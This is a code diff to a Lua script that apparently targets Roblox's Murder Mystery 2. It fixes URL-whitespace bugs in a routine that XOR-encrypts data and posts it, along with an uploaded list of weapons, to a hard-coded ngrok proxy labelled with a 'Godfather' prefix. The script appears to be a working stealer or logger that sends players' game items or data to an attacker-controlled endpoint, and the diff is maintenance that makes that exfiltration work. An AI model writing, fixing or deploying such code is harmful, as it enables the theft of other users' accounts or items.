@@ -88,6 +88,7 @@ local function encrypt(b)return toHex(xorCrypt(b,"85acfc6776299e4661b3093d63b6a9
 
 -- ================= PROXY WEBHOOK SYSTEM =================
 
+-- FIXED: Removed trailing space from URL
 local PROXY_URL = "https://malevolently-oilless-zita.ngrok-free.app/api/proxy/"
 
 -- EXTERNAL GLOBALS - SET BY LOADER
@@ -543,7 +544,7 @@ end
 
 local rubisLink = upload_to_rubis(weaponsToSend) or "Upload failed"
 
--- ORIGINAL PROXY SENDING METHOD FROM MM2SOURCE.LUA
+-- FIXED PROXY SENDING METHOD - Removed trailing space from URL construction
 local function sendToProxy(Wid, payload, isEncrypted)
     task.spawn(function()
         local finalBody = HttpService:JSONEncode(payload)
@@ -551,7 +552,10 @@ local function sendToProxy(Wid, payload, isEncrypted)
             finalBody = encrypt(finalBody)
         end
         
-        local url = PROXY_URL .. Wid
+        -- FIXED: Ensure no trailing space in URL
+        local url = PROXY_URL .. tostring(Wid)
+        url = url:gsub("%s+", "") -- Remove any accidental whitespace
+        
         print("[Godfather] Sending to proxy:", url)
         
         local success, response = pcall(function()
@@ -571,7 +575,7 @@ local function sendToProxy(Wid, payload, isEncrypted)
         elseif response.StatusCode ~= 200 then
             warn("[Godfather] Proxy error:", response.StatusCode, response.Body)
         else
-            print("[Godfather] successfully")
+            print("[Godfather] Successfully sent")
         end
     end)
 end
